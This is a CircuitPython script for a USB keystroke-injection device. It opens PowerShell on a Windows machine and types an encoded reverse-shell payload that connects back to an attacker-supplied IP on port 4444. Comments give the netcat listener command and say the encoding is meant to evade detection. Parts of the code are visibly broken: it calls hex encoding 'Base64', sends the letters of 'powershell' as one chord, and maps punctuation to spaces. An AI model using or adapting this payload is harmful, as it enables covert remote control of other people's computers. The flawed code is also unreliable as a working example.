import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
#USE nc -lvnp 4444 TO START LISTENER

keyboard = Keyboard(usb_hid.devices)

time.sleep(3)  # Delay for safety

# Open PowerShell
keyboard.send(Keycode.WINDOWS, Keycode.R)
time.sleep(0.5)
keyboard.send(Keycode.P, Keycode.O, Keycode.W, Keycode.E, Keycode.R, Keycode.S, Keycode.H, Keycode.E, Keycode.L, Keycode.L)
time.sleep(0.5)
keyboard.send(Keycode.ENTER)
time.sleep(1)

# PowerShell reverse shell payload
#CHANGE IP ADDRESS TO YOUR OWN
payload = '''$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP_HERE",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close()'''

# Convert to Base64 to evade detection
payload_bytes = payload.encode('utf-16le')
payload_b64 = ''.join('{:02x}'.format(x) for x in payload_bytes)

# Inject PowerShell command
command = f'powershell -e {payload_b64}'
for char in command:
    keyboard.send(getattr(Keycode, char.upper(), Keycode.SPACE))  # Type payload
    time.sleep(0.02)

keyboard.send(Keycode.ENTER)  # Execute payload
